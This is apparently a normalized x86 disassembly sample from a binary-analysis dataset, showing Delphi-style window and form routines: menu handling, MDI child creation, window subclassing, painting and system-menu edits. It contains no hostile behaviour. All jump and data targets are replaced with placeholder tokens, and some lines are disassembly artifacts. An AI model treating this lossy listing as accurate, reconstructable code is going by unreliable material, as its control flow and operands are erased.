mov edi eax
mov eax ebx
call sub_44f7d8
push eax
call GetMenu
cmp edi eax
je r-xdata
push 0x0
mov eax ebx
call sub_44f7d8
push eax
call SetMenu
jmp r-xdata
mov eax ebx
call sub_44f7d8
mov edx eax
mov eax esi
call sub_45d310
jmp r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
push eax
mov eax ebx
call sub_44f7d8
push eax
call SetMenu
sub_463a24
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_463a10
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
cmp esi 0x24
jl r-xdata
mov [ ebx + 0x25c ] esi
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub_463a80
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_463a74
cmp bl al
je r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x25c ] eax
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ esi + 0x25c ] eax
sub_463aec
push ebx
mov ebx eax
mov eax ebx
call sub_44edf0
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x70 ] 0xff00000f
jne r-xdata
mov eax ebx
call sub_463ad4
cmp eax [ ebx + 0x70 ]
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_463ad4
mov edx eax
mov eax ebx
call sub_44914c
mov edx 0xff00000f
mov eax ebx
call sub_44914c
pop ebx
retn
sub_463b70
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22b ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x22b ] bl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_44f7d8
push eax
call ShowWindow
sub_463bb0
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx eax
mov al [ ebx + 0x231 ]
test al al
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
cmp al 0x2
jne r-xdata
mov al [ ebx + 0x231 ]
cmp al 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4635c8
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
cmp al 0x1
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x68 ] 0x0
je r-xdata
mov eax ebx
call sub_4635c8
mov eax [ eax + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ rw-data ]
call sub_46703c
dec eax
test eax eax
jl r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_467028
mov eax [ eax + 0x4 ]
mov [ esp ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
call sub_4635c8
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
inc eax
mov [ esp + 0x10 ] eax
xor esi esi
inc esi
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_467028
mov eax [ eax + 0x4 ]
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_46703c
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x8 ] 0x0
inc [ esp + 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x230 ]
cmp al 0x4
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_467028
mov eax [ eax + 0x4 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
cmp al 0x6
jne r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_467028
call sub_466d2c
push eax
mov edx esi
mov eax [ rw-data ]
call sub_467028
call sub_466d10
sub eax ebp
sar eax 0x1
jns r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_467028
call sub_466cf8
mov ebp eax
add ebp [ ebx + 0x40 ]
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_467028
call sub_466cf8
sub ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_467028
call sub_466cf8
push eax
mov edx esi
mov eax [ rw-data ]
call sub_467028
call sub_466d44
pop edx
add edx eax
mov eax [ ebx + 0x48 ]
add eax ebp
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_467028
call sub_466d2c
push eax
mov edx esi
mov eax [ rw-data ]
call sub_467028
call sub_466d10
sub eax ebp
sar eax 0x1
jns r-xdata
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_467028
call sub_466cf8
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_467028
call sub_466d44
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx esi
mov eax [ rw-data ]
call sub_467028
call sub_466d2c
add eax [ ebx + 0x44 ]
push eax
mov edx [ esp + 0xc ]
mov eax [ rw-data ]
call sub_467028
call sub_466d2c
pop edx
sub edx eax
mov [ esp + 0xc ] edx
mov edx esi
mov eax [ rw-data ]
call sub_467028
call sub_466d2c
push eax
mov edx esi
mov eax [ rw-data ]
call sub_467028
call sub_466d10
pop edx
add edx eax
mov eax [ esp + 0xc ]
add eax [ ebx + 0x4c ]
cmp edx eax
jge r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_467028
call sub_466cf8
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_467028
call sub_466d44
add ebp eax
sub ebp [ ebx + 0x48 ]
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_467028
call sub_466cf8
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_467028
call sub_466d44
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ esp + 0x14 ]
mov edx ebp
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov edx esi
mov eax [ rw-data ]
call sub_467028
call sub_466d2c
push eax
mov edx esi
mov eax [ rw-data ]
call sub_467028
call sub_466d10
pop edx
add edx eax
sub edx [ ebx + 0x4c ]
mov [ esp + 0xc ] edx
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
sub_463f04
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_4614b8
mov edx esi
mov eax edi
call sub_4668a8
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov [ esi + 0x24 ] 0x8
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov al [ edi + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x1c ] eax
and [ esi + 0x4 ] 0xbffcffff
mov bl [ edi + 0x228 ]
mov al [ edi + 0x229 ]
mov [ esp ] al
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x80000000
mov [ esi + 0x10 ] 0x80000000
or [ esi + 0x4 ] 0xcf0000
jmp r-xdata
xor eax eax
mov al [ esp ]
cmp eax 0x5
ja r-xdata
mov al [ esp ]
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
jmp [ eax * 4 + jump_table_463fb3 ]
mov [ esp ] 0x2
sub al 0x3
jne r-xdata
mov al [ esp ]
sub al 0x3
jae r-xdata
mov [ esi + 0x8 ] 0x80
lea edx [ esi + 0x8 ]
mov eax edi
call sub_44c5fc
mov al [ r-xdata ]
and al bl
mov ebx eax
cmp [ edi + 0x30 ] 0x0
jne r-xdata
or [ esi + 0x4 ] 0xc00000
jmp r-xdata
or [ esi + 0x4 ] 0xc40000
mov al [ edi + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ esi + 0x4 ]
or eax 0x80000000
or eax 0xc00000
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x101
lea edx [ esi + 0x8 ]
mov eax edi
call sub_44c5fc
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ edi + 0x22b ] 0x0
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov bl [ r-xdata ]
jmp r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov [ esi + 0x14 ] 0x80000000
mov [ esi + 0x18 ] 0x80000000
jmp r-xdata
sub al 0x2
jne r-xdata
mov al [ r-xdata ]
and al bl
mov ebx eax
mov [ esi + 0x24 ] 0x2808
mov eax [ esi + 0x4 ]
or eax __dos_header
or eax 0x80
mov [ esi + 0x4 ] eax
test bl 0x8
je r-xdata
or [ esi + 0x4 ] 0x80000
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x80000000
test [ edi + 0x1d ] 0x2
je r-xdata
or [ esi + 0x8 ] 0x400
test bl 0x4
je r-xdata
or [ esi + 0x4 ] 0x20000
mov al [ edi + 0x22b ]
cmp al 0x1
jne r-xdata
cmp [ edi + 0x22f ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff3fffff
or [ esi + 0x4 ] 0x10000
cmp al 0x2
jne r-xdata
or [ esi + 0x4 ] 0x20000000
jmp r-xdata
mov eax r-xdata
mov [ esi + 0x28 ] eax
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x1000000
jmp r-xdata
sub_46411d
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_4614c8
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al [ ebx + 0x22f ]
sub al 0x2
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_44f7d8
push eax
call SendMessageA
mov eax ebx
call sub_464a74
push eax
push 0x1
push 0x80
mov eax ebx
call sub_44f7d8
push eax
call SendMessageA
jmp r-xdata
mov [ esp + 0x4 ] 0xff00
xor eax eax
mov [ esp ] eax
mov esi [ ebx + 0x258 ]
test esi esi
je r-xdata
dec al
je r-xdata
push 0x56330001
push 0x0
push 0x0
mov eax ebx
call sub_4489b0
push eax
mov eax ebx
call sub_4489f4
push eax
mov eax ebx
call sub_44f7d8
push eax
push 0x0
mov eax [ rw-data ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov edx r-xdata
xor ecx ecx
mov eax 0x200
call sub_406bb8
mov [ ebx + 0x254 ] eax
push ebx
push sub_463060
call sub_421ddc
mov [ ebx + 0x278 ] eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call GetWindowLongA
mov [ ebx + 0x274 ] eax
mov eax [ ebx + 0x278 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax esi
call sub_459dc4
mov [ esp ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov eax ebx
call sub_44f7d8
push eax
call SetWindowPos
jmp r-xdata
sub_464262
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff4c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xb4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_46438d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov esi edx
lea edi [ ebp - 0xb0 ]
mov ecx 0x23
[ edi ] [ esi ]
and [ ebp - 0xa8 ] 0xfff7ffff
lea edx [ ebp - 0xb0 ]
mov eax ebx
call sub_44c960
and [ ebx + 0x2f4 ] 0xef
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0xb4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7fc
call sub_4038f4
cmp [ eax + 0x254 ] 0x0
jne r-xdata
mov eax ebx
call sub_466780
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464394
lea eax [ edx + 0x4c ]
mov [ ebp - 0x24 ] eax
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x0
push 0x220
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
mov [ ebx + 0x180 ] eax
or [ ebx + 0x2f4 ] 0x10
jmp r-xdata
sub_46439c
push ebx
mov ebx eax
test [ ebx + 0x2f4 ] 0x10
je r-xdata
mov eax ebx
call sub_44cbcc
push 0x0
mov eax ebx
call sub_44f7d8
push eax
push 0x221
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
xor eax eax
mov [ ebx + 0x254 ] eax
pop ebx
retn
sub_4643e0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x254 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44d350
cmp [ esi ] 0x5
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebx + 0x254 ]
push eax
mov eax ebx
call sub_44f7d8
push eax
call DefFrameProcA
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_44f7d8
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop esi
pop ebx
retn
sub_464444
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4644ec
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi [ ebx + 0x220 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4644f3
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
test edi edi
je r-xdata
mov [ ebx + 0x220 ] edi
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp ebx edi
je r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7fc
call sub_4038f4
mov eax edi
call sub_4607d8
cmp ebx eax
jne r-xdata
mov eax ebx
mov si 0xffb2
call sub_403324
mov eax ebx
call sub_4647fc
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax edi
mov si 0xffb8
call sub_403324
test al al
jne r-xdata
sub_4644fc
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test bl bl
je r-xdata
mov edx [ edi + 0x220 ]
mov eax esi
call sub_44c2b4
test al al
je r-xdata
mov edx [ edi + 0x224 ]
mov eax esi
call sub_44c2b4
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax edi
call sub_464444
mov eax [ esi + 0x30 ]
mov [ edi + 0x224 ] eax
sub_464544
push ebx
push esi
mov esi eax
mov bl [ esi + 0x22e ]
mov eax esi
call sub_464444
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_464568
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor ebx ebx
inc [ rw-data ]
cmp [ edi + 0x250 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x64 ] edx
mov eax [ rw-data ]
mov [ eax + 0x68 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov edx edi
call sub_41889c
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov ecx edi
xor edx edx
call sub_41877c
mov eax edi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
cmp edi [ ebp - 0x4 ]
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
mov [ eax + 0x6c ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov edx edi
call sub_41889c
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov ecx edi
xor edx edx
call sub_41877c
jmp r-xdata
xor eax eax
mov [ edi + 0x220 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x220 ] eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x54 ]
or ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] ax
xor edx edx
push ebp
push sub_4647d8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
cmp edi eax
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
cmp [ edi + 0x224 ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ edi + 0x224 ] edi
mov eax [ rw-data ]
mov [ eax + 0x78 ] edi
mov eax edi
call sub_44f7d8
mov dx 0xb000
call sub_460564
test al al
jne r-xdata
call sub_44f7d8
mov esi eax
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov dx 0xb001
mov eax esi
call sub_460564
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4647df
mov eax [ ebp - 0x4 ]
mov dx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
retn
jmp r-xdata
call sub_4039a0
jmp r-xdata
call sub_4039a0
jmp r-xdata
mov esi [ edi + 0x224 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_44c2b4
test al al
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
call sub_44f7d8
mov esi eax
mov eax [ edi + 0x224 ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x224 ] eax
mov dx 0xb01b
mov eax esi
call sub_460564
test al al
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
cmp eax [ edi + 0x224 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax edi
call sub_44a198
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
call sub_4039a0
jmp r-xdata
mov esi eax
mov [ edi + 0x224 ] esi
mov eax esi
call sub_44f7d8
mov dx 0xb01a
call sub_460564
test al al
jne r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov esi [ esi + 0x30 ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
call sub_4039a0
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_44a198
sub_4647fc
push ebx
push esi
mov edx [ eax + 0x220 ]
test edx edx
je r-xdata
mov ebx eax
cmp [ eax + 0x250 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb029
mov eax ebx
call sub_44a198
mov ebx edx
jmp r-xdata
mov eax ebx
call sub_44f7d8
push eax
call SetFocus
mov eax ebx
call sub_44f7d8
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
sub_46484c
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0x22e ] bl
mov eax [ esi + 0x27c ]
test eax eax
je r-xdata
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb02b
call sub_44a198
pop esi
pop ebx
retn
cmp [ esi + 0x220 ] 0x0
jne r-xdata
mov dl 0x1
mov eax esi
call sub_464900
mov eax esi
call sub_4647fc
test [ esi + 0x1c ] 0x10
jne r-xdata
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax esi
call sub_44fc00
mov edx eax
mov eax esi
call sub_464444
sub_4648b0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x22e ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4634c8
test eax eax
je r-xdata
push esi
xor ecx ecx
mov edx 0xb004
mov eax [ ebx + 0x220 ]
call sub_44a198
mov eax ebx
call sub_4634c8
mov edx esi
call sub_4648b0
sub_464900
push esi
test [ eax + 0x2f4 ] 0x8
jne r-xdata
pop esi
retn
mov ecx [ rw-data ]
cmp [ ecx + 0x44 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x248 ] 0x0
je r-xdata
mov ecx [ rw-data ]
cmp eax [ ecx + 0x44 ]
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
xor esi esi
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x22f ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x248 ]
test dl dl
je r-xdata
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx esi
call sub_45d8f0
mov edx esi
call sub_45d8d4
jmp r-xdata
mov ecx [ eax + 0x248 ]
cmp [ ecx + 0x5c ] 0x0
jne r-xdata
mov esi [ eax + 0x248 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_4649a8
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebx edx
mov ebp eax
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
cmp edi ebx
je r-xdata
mov ebx esi
push 0x0
push 0x0
push ebp
mov eax ebx
call sub_44f7d8
push eax
call SendMessageA
sub_4649f4
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb000
call sub_4649a8
cmp [ ebx + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_464a24
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb001
call sub_4649a8
cmp [ ebx + 0x2a2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
sub_464a90
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_424f1c
xor eax eax
push ebp
push sub_464b3e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov edx ebx
call sub_425300
xor eax eax
push ebp
push sub_464b1b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_403324
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0x28 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464b22
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
xor edx edx
call sub_425300
retn
sub_464b4c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] dl
mov [ esp ] eax
xor ebx ebx
mov eax [ esp ]
call sub_4634c8
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp ]
call sub_4634fc
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
mov dl [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov si 0xffd1
call sub_403324
mov ebx eax
test [ esp + 0x4 ] bl
jne r-xdata
inc ebp
mov [ esp + 0x8 ] 0x0
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov dl [ esp + 0x4 ]
mov eax [ esp ]
call sub_44eaa0
mov ebx eax
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_463548
mov edi eax
cmp edi [ esp + 0xc ]
je r-xdata
inc [ esp + 0x8 ]
dec ebp
jne r-xdata
mov dl [ esp + 0x4 ]
mov eax edi
mov si 0xffd1
call sub_403324
or bl al
test [ esp + 0x4 ] bl
jne r-xdata
sub_464bec
push ebx
push esi
add esp 0xffffffc0
mov esi edx
mov ebx eax
mov eax ebx
call sub_44f7d8
push eax
call IsIconic
test eax eax
jne r-xdata
push esp
mov eax ebx
call sub_44f7d8
push eax
call BeginPaint
mov esi eax
mov eax ebx
call sub_464a74
push eax
push 0x0
push 0x0
push esi
call DrawIcon
push esp
mov eax ebx
call sub_44f7d8
push eax
call EndPaint
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
call sub_44d968
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
jmp r-xdata
add esp 0x40
pop esi
pop ebx
retn
sub_464c6a
add [ eax ] al
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x170 ]
call sub_424a6c
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
jmp r-xdata
sub_464ccc
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_44f7d8
push eax
call IsIconic
test eax eax
jne r-xdata
mov [ edi ] 0x27
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
retn
mov edx edi
mov eax esi
call sub_44dc2c
pop edi
pop esi
retn
sub_464d18
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44f7d8
push eax
call GetSystemMenu
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x2
jne r-xdata
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x400
push 0x7
push ebx
call DeleteMenu
push 0x400
push 0x5
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x4
jne r-xdata
push 0x1
